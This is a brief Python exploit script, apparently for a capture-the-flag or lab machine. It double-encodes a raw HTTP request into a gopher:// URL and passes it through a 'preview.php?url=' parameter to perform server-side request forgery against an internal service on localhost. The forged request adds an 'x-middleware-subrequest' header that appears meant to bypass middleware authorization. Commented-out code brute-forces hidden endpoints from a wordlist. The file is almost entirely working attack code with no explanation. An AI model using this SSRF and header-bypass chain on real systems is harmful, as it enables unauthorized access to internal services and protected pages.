import urllib.parse
import requests



# wordlist = "/usr/share/wordlists/dirb/common.txt"

# wordlist_map=[]
# with open(wordlist, 'r', encoding='utf-8', errors='ignore') as file:
#     for line in file:
#         word = line.strip()
#         wordlist_map.append(word)

# wordlist = ["home","api","admin", "api", "flag", "management", "login", "dashboard", "book"]

wordlist = ['management']

for word in wordlist:
    http_request = (
    f"GET /{word} HTTP/1.1\r\n"
    "Host: 127.0.0.1:10000\r\n"
    "x-middleware-subrequest: middleware\r\n"
    # "Content-Length: 0\r\n"
    "\r\n"
    )

    encoded = http_request.replace(" ", "%20")
    encoded = encoded.replace("\r", "%0d")
    encoded = encoded.replace("\n", "%0a")

    double_encoded = encoded.replace("%", "%25")

    gopher_url = f"gopher://127.0.0.1:10000/_{double_encoded}"


    final_url = f"http://cvssm1/preview.php?url={gopher_url}"

    print("[*] Sending request...")
    print("URL:", final_url)
    response = requests.get(final_url, timeout=10)

    print('response:',response.text)
    # if word and "HTTP/1.1 404 Not Found" not in response.text:
    #     print("ENDPOINT FOUND>:", word)
    #     print('response',response.text)
    #     break


